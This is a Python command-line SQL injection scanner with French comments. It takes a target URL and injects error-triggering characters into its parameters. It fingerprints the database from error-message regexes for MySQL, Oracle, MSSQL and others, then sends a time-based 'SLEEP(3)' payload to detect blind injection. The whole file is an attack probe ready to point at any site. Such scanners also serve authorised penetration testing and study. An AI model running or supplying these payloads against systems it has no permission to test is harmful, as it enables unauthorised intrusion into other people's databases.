import optparse
import requests
import re
import urllib
import urllib.parse
import urllib.request
from colorama import Fore

headers = {
    "User-Agent": "MonAgentUtilisateur/1.0",  
    "Accept-Language": "fr-FR"  
}                               

DBMS_ERRORS = {                                 
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}

def _retrieve_content(url):

    response = urllib.request.urlopen(url)
    retval = response.read().decode('utf-8')
    return retval                        # RETVAL = return value = html

def scan_page(url):
    original= None
    database = "Undefined"
    sqli = False

    for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):  
        sqli = True
        print("* scanning '%s'" % ( match.group("parameter")))
        original = _retrieve_content(url)  
        tampered = url + "\'\")("                 # URL avec generateur d'erreur
        content = _retrieve_content(tampered)     # html de page d'erreur
        print("Test for error message on",tampered)

        for dbms in DBMS_ERRORS:                    ##Cherche pour
            for regex in DBMS_ERRORS[dbms]:         ## un mot cle dans la page d'erreur
                if re.search(regex, content, re.I) and not re.search(regex, original, re.I):
                    print(Fore.RED + f"Parameter '{match.group('parameter')}' appears to be **ERROR** SQLi vulnerable")
                    database = dbms
	
    if not sqli:
        print("No SQLi found :(");

    print()
    print(Fore.YELLOW+"Database type =", database)
    print()
	

def test_time_attack(url):
	for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):

		response = requests.get(url,headers=headers)
		response_time = response.elapsed.total_seconds()

		url_time_attack = url + urllib.parse.quote(" AND (SELECT SLEEP(3))") #calcule temps de rep avec time attack
		print(Fore.WHITE+"Test with time attack :" , url_time_attack)
		response = requests.get(url_time_attack, headers=headers)
		response_time2 = response.elapsed.total_seconds()

		if response_time + 2 < response_time2:
			 print(Fore.RED +"Parameter '%s' appears to be **TIME** SQLi vulnerable" % ( match.group("parameter")))
        


if __name__ == "__main__":

    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    options, _ = parser.parse_args()

    print(Fore.WHITE+"*------------------------------------------------------------------------*")

    scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url)
    test_time_attack(options.url)

    print(Fore.WHITE+"*------------------------------------------------------------------------*")